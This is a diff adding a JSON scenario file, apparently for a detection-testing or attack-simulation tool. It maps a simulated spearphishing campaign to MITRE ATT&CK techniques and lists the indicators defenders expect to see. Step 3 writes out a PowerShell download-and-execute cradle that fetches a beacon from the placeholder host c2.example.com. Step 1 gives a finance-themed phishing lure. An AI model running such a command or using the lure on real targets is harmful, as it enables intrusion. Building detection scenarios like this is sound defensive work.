@@ -1,0 +1,126 @@
+{
+  "id": "phishing-campaign-001",
+  "name": "Spearphishing Campaign with Payload Execution",
+  "description": "Simulation of targeted spearphishing attack leading to initial access and code execution",
+  "mitreTactics": [
+    {
+      "id": "TA0001",
+      "name": "Initial Access",
+      "techniques": [
+        {
+          "id": "T1566.001",
+          "name": "Phishing: Spearphishing Attachment",
+          "platform": ["Windows", "macOS", "Linux"],
+          "dataSource": ["Email Gateway", "Email Content", "File Monitoring"]
+        }
+      ]
+    },
+    {
+      "id": "TA0002",
+      "name": "Execution",
+      "techniques": [
+        {
+          "id": "T1204.002",
+          "name": "User Execution: Malicious File",
+          "platform": ["Windows", "macOS", "Linux"],
+          "dataSource": ["Process Monitoring", "Command Execution"]
+        },
+        {
+          "id": "T1059.001",
+          "name": "Command and Scripting Interpreter: PowerShell",
+          "platform": ["Windows"],
+          "dataSource": ["PowerShell Logs", "Script Execution"]
+        }
+      ]
+    }
+  ],
+  "steps": [
+    {
+      "stepNumber": 1,
+      "description": "Send spearphishing email with weaponized Office document attachment",
+      "techniqueId": "T1566.001",
+      "action": {
+        "type": "access",
+        "parameters": {
+          "target": "finance-team@target.example.com",
+          "subject": "Q4 Financial Report - Urgent Review Required",
+          "attachment": "Q4_Report_2024.docx",
+          "payload": "embedded-macro"
+        },
+        "logicalOutcome": "Email delivered, attachment downloaded by 3 recipients"
+      },
+      "expectedResult": "Initial access vector established",
+      "timingOffset": 0,
+      "simulated": true
+    },
+    {
+      "stepNumber": 2,
+      "description": "User opens document and enables macros, triggering payload",
+      "techniqueId": "T1204.002",
+      "action": {
+        "type": "execution",
+        "parameters": {
+          "file": "Q4_Report_2024.docx",
+          "action": "macro-execution",
+          "payload-type": "vba-script"
+        },
+        "logicalOutcome": "VBA macro executed, dropped secondary payload to temp directory"
+      },
+      "expectedResult": "Code execution achieved on target workstation",
+      "timingOffset": 3,
+      "simulated": true
+    },
+    {
+      "stepNumber": 3,
+      "description": "Execute obfuscated PowerShell script for C2 beacon establishment",
+      "techniqueId": "T1059.001",
+      "action": {
+        "type": "execution",
+        "parameters": {
+          "interpreter": "powershell.exe",
+          "command": "IEX (New-Object Net.WebClient).DownloadString('http://c2.example.com/beacon.ps1')",
+          "obfuscation": "base64-encoded"
+        },
+        "logicalOutcome": "C2 channel established, beacon initiated every 60 seconds"
+      },
+      "expectedResult": "Persistent C2 communication",
+      "timingOffset": 6,
+      "simulated": true
+    }
+  ],
+  "expectedDetectionIndicators": [
+    {
+      "type": "network",
+      "indicator": "Email with suspicious attachment from external domain",
+      "confidence": "medium",
+      "techniqueId": "T1566.001"
+    },
+    {
+      "type": "file",
+      "indicator": "Office document with embedded macros from untrusted source",
+      "confidence": "high",
+      "techniqueId": "T1204.002"
+    },
+    {
+      "type": "process",
+      "indicator": "PowerShell execution with encoded commands",
+      "confidence": "high",
+      "techniqueId": "T1059.001"
+    },
+    {
+      "type": "network",
+      "indicator": "Outbound HTTPS connection to suspicious domain",
+      "confidence": "high",
+      "techniqueId": "T1059.001"
+    },
+    {
+      "type": "behavioral",
+      "indicator": "Office application spawning PowerShell process",
+      "confidence": "critical",
+      "techniqueId": "T1204.002"
+    }
+  ],
+  "impact": "medium",
+  "difficulty": "intermediate",
+  "estimatedDuration": 60
+}
